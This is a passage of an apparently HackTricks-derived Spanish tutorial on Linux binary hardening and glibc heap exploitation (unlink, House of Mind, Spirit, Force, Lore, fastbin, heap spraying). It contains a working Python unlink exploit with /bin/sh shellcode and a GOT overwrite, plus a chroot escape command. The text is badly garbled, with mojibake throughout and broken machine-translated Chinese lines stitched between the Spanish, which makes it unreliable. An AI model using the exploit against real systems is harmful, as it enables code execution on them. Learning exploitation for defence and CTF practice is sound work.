è¦æ£€æŸ¥ç¨‹åºæ˜¯å¦ä½¿ç”¨bindç°åœ¨å¯ä»¥åšï¼š

```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```

Cuando el binario es cargado en memoria y una funciÃ³n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aquÃ­ se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcciÃ³n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcciÃ³n y la guarde en la GOT.

Cuando se llama a una funciÃ³n se llama a la PLT, esta tiene la direcciÃ³n de la GOT donde se almacena la direcciÃ³n de la funciÃ³n, por lo que redirige el flujo allÃ­ y asÃ­ se llama a la funciÃ³n. Sin embargo, si es la primera vez que se llama a la funciÃ³n, lo que hay en la GOT es la siguiente instrucciÃ³n de la PLT, por lo tanto el flujo sigue el cÃ³digo de la PLT (rtfd) y averigua la direcciÃ³n de la funciÃ³n, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en quÃ© offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding â€”> La direcciÃ³n de la funciÃ³n se busca la primera vez que se invoca dicha funciÃ³n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ahÃ­ y no haya que volver a buscarla.

Bind now â€”> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no estÃ¡n complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** â€”> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

** fortify source -d \ _fortify \ _source = 1 o = 2 **

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funciÃ³n por una funciÃ³n segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

strcpyï¼ˆä½†æ˜¯ï¼Œæ¥æºï¼‰ï¼›

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tamaÃ±o del buffer como tamaÃ±o mÃ¡ximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una secciÃ³n con permisos de escritura. AdemÃ¡s el parÃ¡metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la direcciÃ³n de otro sitio (como una variable global) el mensaje de error mostrarÃ¡ el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No estÃ¡ estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

** ASCIIè£…ç”²åœ°å€ç©ºé—´**

Consiste en cargar las librerÃ­a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ningÃºn ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la funciÃ³n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funciÃ³n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2Âºbyte de system()â€¦ Al final se llama la direcciÃ³n guardada en GOT que serÃ¡ system()

**Falso EBP**

** Falso EBP **

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambiÃ©n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despuÃ©s la direcciÃ³n a &â€/bin/shâ€.

**Jaulas con chroot()**

** jaulas con chrootï¼ˆï¼‰**

debootstrap -arch=i386 hardy /home/user â€”> Instala un sistema bÃ¡sico bajo un subdirectorio especÃ­fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**InstrumentaciÃ³n de cÃ³digo**

Valgrind â€”> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits bÃ¡sicos**

## ** 8å †æº¢å‡ºï¼šåˆ©ç”¨BÃ¡sicos**

**Trozo asignado**

prev\_size |\
size | â€”Cabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\

\*fd | PTRå‰è¿›å—\\*bk | Ptr back chunk â€”Cabecera\

\*bk | ptr backå—-Cabecera \
\*mem | Datos

Los trozos libres estÃ¡n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En â€œsizeâ€ hay bits para indicar: Si el trozo anterior estÃ¡ en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo mÃ¡s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; â€”> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; â€”> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; â€”> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; â€”> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la direcciÃ³n de un shellcode y el P->fd con la direcciÃ³n a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\

bk = p-> bk = \ï¼†shellCode \
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y asÃ­ se se ejecuta al salir del programa la shellcode.

AdemÃ¡s, la 4Âº sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Esto provoca la escritura de 4 bytes a partir del 8Âº byte de la shellcode, por lo que la primera instrucciÃ³n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

DespuÃ©s de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que estÃ¡ libre) y â€œ-4â€œ(0xfffffffc) en el size (para que cuando compruebe en el 3Âº trozo si el 2Âº estaba libre en realidad vaya al prev\_size modificado que le dirÃ¡ que sÂ´estÃ¡ libre) -> AsÃ­ cuando free() investigue irÃ¡ al size del 3Âº pero en realidad irÃ¡ al 2Âº - 4 y pensarÃ¡ que el 2Âº trozo estÃ¡ libre. Y entonces llamarÃ¡ a **unlink()**.

Al llamar a unlink() usarÃ¡ como P->fd los primeros datos del 2Âº trozo por lo que ahÃ­ se meterÃ¡ la direcciÃ³n que se quieres sobreescribir - 12(pues en FD->bk le sumarÃ¡ 12 a la direcciÃ³n guardada en FD) . Y en esa direcciÃ³n introducirÃ¡ la segunda direcciÃ³n que encuentre en el 2Âº trozo, que nos interesarÃ¡ que sea la direcciÃ³n a la shellcode(P->bk falso).

**from struct import \***

**ä»structå¯¼å…¥\ ***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev\_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #DirecciÃ³n de free() en la plt-12 (serÃ¡ la direcciÃ³n que se sobrescrita para que se lanza la shellcode la 2Âº vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sÃ­**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2Âº trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a estÃ¡ libre.

AdemÃ¡s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensarÃ¡ que â€œaâ€ estÃ¡ libre y en un bin, por lo que llamarÃ¡ a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensarÃ¡ que el trozo de â€œaâ€ realmente empieza en b+4. Es decir, harÃ¡ un unlink() a un trozo que comienza en b+4, por lo que en b+12 estarÃ¡ el puntero â€œfdâ€ y en b+16 estarÃ¡ el puntero â€œbkâ€.

De esta forma, si en bk ponemos la direcciÃ³n a la shellcode y en fd ponemos la direcciÃ³n a la funciÃ³n â€œputs()â€-12 tenemos nuestro payload.

**TÃ©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad Ãºtil cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funciÃ³n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificarÃ¡ el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tamaÃ±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcciÃ³n.

En caso de querer volver a usar uno se asignarÃ­a sin problemas. En caso de querer usar otro, se le asignarÃ­a el mismo espacio por lo que tendrÃ­amos los punteros â€œfdâ€ y â€œbkâ€ falseados con los datos que escribirÃ¡ la reserva anterior.

**After free()**

**å…è´¹ï¼ˆï¼‰**
Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

## ** 8å †æº¢å‡ºï¼šåˆ©ç”¨Avanzados **
Las tÃ©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funciÃ³n unlink().

**The house of mind**

**å¿ƒç†ä¹‹å®¶**

Solo una llamada a free() es necesaria para provocar la ejecuciÃ³n de cÃ³digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Devuelve un puntero a la direcciÃ³n donde comienza el trozo (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

ar \ _ptr = arena \ _ for \ _chunkï¼ˆpï¼‰;  - >å—\ _non \ _main \ _arenaï¼ˆptrï¼‰ï¼Ÿ

â€¦

\_int\_free(ar\_ptr, mem);

\ _int \ _freeï¼ˆar \ _ptrï¼Œmemï¼‰;

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaciÃ³n devuelva true y ejecute heap\_for\_ptr() que hace un and a â€œmemâ€ dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcciÃ³n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrarÃ¡ que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ahÃ­ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la Ãºltima instrucciÃ³n se escribirÃ¡ en \_\_DTOR\_END\_\_ la direcciÃ³n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcciÃ³n de \_\_DTOR\_END\_\_-12 porque de ahÃ­ la sacarÃ¡ av->bins\[2]

En la direcciÃ³n que caiga la direcciÃ³n del segundo trozo con los Ãºltimos 5 ceros hay que escribir la direcciÃ³n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr estÃ¡ al inicio del primer trozo y saque de ahÃ­ el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaciÃ³n en el trozo 2 ponemos un montÃ³n de nops y finalmente la shellcode

De esta forma se llamarÃ¡ a \_int\_free(TROZO1, TROZO2) y seguirÃ¡ las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcciÃ³n del prev\_size del TROZO2 el cual saltarÃ¡ a la shellcode.

Para aplicar esta tÃ©cnica hace falta que se cumplan algunos requerimientos mÃ¡s que complican un poco mÃ¡s el payload.

Esta tÃ©cnica ya no es aplicable pues se aplicÃ³ casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambiÃ©n le estÃ¡ apuntando a Ã©l.

**Fastbin**

Es una variante de The house of mind

Es Una Variante de Mind House

nos interesa llegar a ejecutar el siguiente cÃ³digo al cuÃ¡l se llega pasada la primera comprobaciÃ³n de la funciÃ³n \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Siendo fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

De esta forma si se pone en â€œfbâ€ da direcciÃ³n de una funciÃ³n en la GOT, en esta direcciÃ³n se pondrÃ¡ la direcciÃ³n al trozo sobrescrito. Para esto serÃ¡ necesario que la arena estÃ© cerca de las direcciones de dtors. MÃ¡s exactamente que av->max\_fast estÃ© en la direcciÃ³n que vamos a sobreescribir.

Dado que con The House of Mind se vio que nosotros controlÃ¡bamos la posiciÃ³n del av.

Entones si en el campo size ponemos un tamaÃ±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() nos devolverÃ¡ fastbins\[-1], que apuntarÃ¡ a av->max\_fast

En este caso av->max\_fast serÃ¡ la direcciÃ³n que se sobrescrita (no a la que apunte, sino esa posiciÃ³n serÃ¡ la que se sobrescrita).

AdemÃ¡s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como ademÃ¡s la shellcode irÃ¡ en el trozo liberado, habrÃ¡ que poner al ppio un jmp que caiga en nops).

AdemÃ¡s, ese mismo trozo falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes mÃ¡s allÃ¡.

Por culpa de los nulos de \_DTOR\_END\_ y de las pocas direcciones en la GOT, ninguna direcciÃ³n de estas secciones sirven para ser sobrescritas, asÃ­ que veamos como aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que de 16 en vez de 8 entonces: fastbin\_index() nos devolverÃ¡ fastbins\[0] y podemos hacer uso de esto para sobreescribir la pila.

Para esto no debe haber ningÃºn canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET

Los 4 bytes nulo se necesitan que el **av** estarÃ¡ a esta direcciÃ³n y el primero elemento de un **av** es el mutexe que tiene que valer 0.

El **av->max\_fast** serÃ¡ el EBP y serÃ¡ un valor que nos servirÃ¡ para saltarnos las restricciones.

En el **av->fastbins\[0]** se sobreescribirÃ¡ con la direcciÃ³n de **p** y serÃ¡ el RET, asÃ­ se saltarÃ¡ a la shellcode.

AdemÃ¡s, en **av->system\_mem** (1484bytes por encima de la posiciÃ³n en la pila) habrÃ¡ bastante basura que nos permitirÃ¡ saltarnos la comprobaciÃ³n que se realiza.

AdemÃ¡s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como ademÃ¡s la shellcode irÃ¡ en el trozo liberado, habrÃ¡ que poner al ppio un jmp que caiga en nops que van despuÃ©s del campo size del nuevo trozo falso).

**The House of Spirit**

**ç²¾ç¥ä¹‹å±‹**

En este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero estÃ© en el stack debajo de un posible overflow a una variable).

AsÃ­, podrÃ­amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es vÃ¡lido, el tamaÃ±o del trozo falseado debe ser menor que av->max\_fast y mÃ¡s especÃ­ficamente igual al tamaÃ±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despuÃ©s de este puntero vulnerable se llama a malloc(40), el tamaÃ±o del trozo falso debe ser igual a 48.

Si por ejemplo el programa preguntase al usuario por un nÃºmero podrÃ­amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podrÃ­an pertenecer al EBP con suerte, asÃ­ el 48 queda por detrÃ¡s, como si fuese la cabecera size). AdemÃ¡s, la direcciÃ³n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system\_mem.

En caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignarÃ¡ como direcciÃ³n la direcciÃ³n del EBP. En caso de que el atacante tambiÃ©n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcciÃ³n que quiera.

Esto creo que es porque asÃ­ cuando lo libere free() guardarÃ¡ que en la direcciÃ³n que apunta al EBP del stack hay un trozo de tamaÃ±o perfecto para el nuevo malloc() que se quiere reservar, asÃ­ que le asigna esa direcciÃ³n.

**The House of Force**

**éƒ¨é˜Ÿçš„æˆ¿å­**

Es necesario:

* Un overflow a un trozo que permita sobreescribir el wilderness
* Una llamada a malloc() con el tamaÃ±o definido por el usuario
* Una llamada a malloc() cuyos datos puedan ser definidos por el usuario

Lo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), asÃ­ cual quiera solicitud de memoria lo suficientemente grande serÃ¡ tratada en \_int\_malloc() sin necesidad de expandir el heap

Lo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondrÃ¡ \&EIP - 8.

Tenemos que sobreescrbir av->top para que apunte a la zona de memoria bajo el control del atacante:

victim = av->top;

å—å®³è€…= av-> top;

remainder = chunck\_at\_offset(victim, nb);

å‰©ä½™=å—\ _at__ offsetï¼ˆå—å®³è€…ï¼Œnbï¼‰;

av->top = remainder;

Victim recoge el valor de la direcciÃ³n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcciÃ³n mÃ¡s la cantidad de bytes solicitados por malloc(). Por lo que si \&EIP-8 estÃ¡ en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top quede apuntando a $EIP-8 para el prÃ³ximo malloc() serÃ¡:

0xbffff224 - 0x080c2788 = 3086207644.

AsÃ­ se guardarÃ¡ en av->top el valor alterado y el prÃ³ximo malloc apuntarÃ¡ al EIP y lo podrÃ¡ sobreescribir.

Es importante saber que el size del nuevo trozo wilderness sea mÃ¡s grande que la solicitud realizada por el Ãºltimo malloc(). Es decir, si el wilderness estÃ¡ apuntando a \&EIP-8, el size quedarÃ¡ justo en el campo EBP del stack.

**The House of Lore**

**ä¼ è¯´ä¹‹å®¶**

**CorrupciÃ³n SmallBin**

Los trozos liberados se introducen en el bin en funciÃ³n de su tamaÃ±o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaciÃ³n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva mÃ¡s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.

Para alcanzar el cÃ³digo vulnerable la solicitud de memora deberÃ¡ ser mayor a av->max\_fast (72normalmente) y menos a MIN\_LARGE\_SIZE (512).

Si en los bin hay un trozo del tamaÃ±o adecuado a lo que se pide se devuelve ese despuÃ©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la Ãºnica info que podemos alterar.

bin->bk = bck; El penÃºltimo trozo pasa a ser el Ãºltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le darÃ¡ esta direcciÃ³n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:

Que se reserven dos malloc, de forma que al primero se le pueda hacer overflow despuÃ©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)

Que el malloc reservado al que se le da la direcciÃ³n elegida por el atacante sea controlada por el atacante.

El objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le engaÃ±arÃ¡ y se le dirÃ¡ que el Ãºltimo trozo de la lista (el siguiente en ofrecer) estÃ¡ en la direcciÃ³n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en Ã©l, se le darÃ¡ un trozo en la posiciÃ³n deseada y podrÃ¡ escribir en ella.

Tras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, asÃ­ el trozo modificado saldrÃ¡ de unsorted bins y se introducirÃ­a en su bin.

Una vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcciÃ³n que queramos sobreescribir.

AsÃ­ el bin deberÃ¡ esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y engaÃ±e a bin haciÃ©ndole creer que el siguiente trozo estÃ¡ en la direcciÃ³n falsa. Y a continuaciÃ³n se darÃ¡ el trozo que nos interesa.

Para que se ejecute la vulnerabilidad lo antes posible lo ideal serÃ­a: Reserva del trozo vulnerable, reserva del trozo que se modificarÃ¡, se libera este trozo, se reserva un trozo mÃ¡s grande al que se modificarÃ¡, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tamaÃ±o al vulnerado y se reserva un segundo trozo de igual tamaÃ±o y este serÃ¡ el que apunte a la direcciÃ³n elegida.

Para proteger este ataque se uso la tÃ­pica comprobaciÃ³n de que el trozo â€œnoâ€ es falso: se comprueba si bck->fd estÃ¡ apuntando a victim. Es decir, en nuestro caso si el puntero fd\* del trozo falso apuntado en el stack estÃ¡ apuntando a victim. Para sobrepasar esta protecciÃ³n el atacante deberÃ­a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcciÃ³n adecuada la direcciÃ³n de victim. Para que asÃ­ parezca un trozo verdadero.

**CorrupciÃ³n LargeBin**

Se necesitan los mismos requisitos que antes y alguno mÃ¡s, ademÃ¡s los trozos reservados deben ser mayores a 512.

El ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero ademÃ¡s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.

Por ejemplo harÃ¡ que poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)

AdemÃ¡s se ha introducido un parche para hacerlo aÃºn mÃ¡s complicado.

**Heap Spraying**

BÃ¡sicamente consiste en reservar tooda la memoria posible para heaps y rellenar estos con un colchÃ³n de nops acabados por una shellcode. AdemÃ¡s, como colchÃ³n se utiliza 0x0c. Pues se intentarÃ¡ saltar a la direcciÃ³n 0x0c0c0c0c, y asÃ­ si se sobreescribe alguna direcciÃ³n a la que se vaya a llamar con este colchÃ³n se saltarÃ¡ allÃ­. BÃ¡sicamente la tÃ¡ctica es reservar lo mÃ¡ximos posible para ver si se sobreescribe algÃºn puntero y saltar a 0x0c0c0c0c esperando que allÃ­ haya nops.

**Heap Feng Shui**

Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situarÃ¡ en uno de los huevos.

**objdump -d ejecutable** â€”> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** â€”> Get function address\
**objdump -d -Mintel ./shellcodeout** â€”> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes\
**objdump -t ./exec | grep varBss** â€”> Tabla de sÃ­mbolos, para sacar address de variables y funciones\
**objdump -TR ./exec | grep exit(func lib)** â€”> Para sacar address de funciones de librerÃ­as (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> Saca la direcciÃ³n de puts a sobreescribir en le GOT\
**objdump -D ./exec** â€”> Disas ALL hasta las entradas de la plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Info de la funciÃ³n en gdb

## Interesting courses

##æœ‰è¶£çš„è¯¾ç¨‹

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **References**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

*[** httpsï¼š//guyinatuxedo.github.io/7.2-mitigation \ _relro/index.html **]ï¼ˆhttps://guyinatuxedo.github.io.io/7.2-mitigation \ _relro/index.htmlï¼‰

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

*æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

*å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

*è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰
* **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

** **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth
